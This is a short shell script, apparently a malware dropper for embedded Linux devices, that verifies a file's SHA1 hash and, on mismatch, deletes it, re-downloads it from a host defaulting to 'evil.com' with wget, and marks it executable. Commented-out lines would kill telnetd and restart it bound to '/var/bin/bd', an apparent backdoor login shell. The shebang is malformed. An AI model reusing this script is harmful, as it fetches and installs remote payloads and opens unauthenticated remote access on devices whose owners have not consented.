#!/bin.bash
##!/var/bin/ash


getfile=${1:-"null"}
hash=${2:-"null"}
path=${3:-"/var/bin"}
host=${4:-"evil.com"}

case $1 in "null")
echo 'Usage: checkhash <file> <hash> <path> <host>'
echo 'At least file and hash are required'
;;

*)
if ! (echo $hash *${path}/$getfile | sha1sum -c -) > /dev/null 2>&1 ;then 
  rm ${path}/$getfile
  for i in a b c;do  
    wget -O ${path}/$getfile ${host}/$getfile
    if [ "$?" -eq "0" ];then  
      if (echo $hash *${path}/$getfile | sha1sum -c -) > /dev/null 2>&1 ;then 
        chmod +x ${path}/$getfile;
      #trap "" 1 2 ;\
      #(killall telnetd;telnetd -l /var/bin/bd;echo $?)
        echo "Status: $?"
        break
      fi
    
    else 
      sleep $(echo $RANDOM|head -c 2)
    fi
  done 
fi
;;
esac

exit
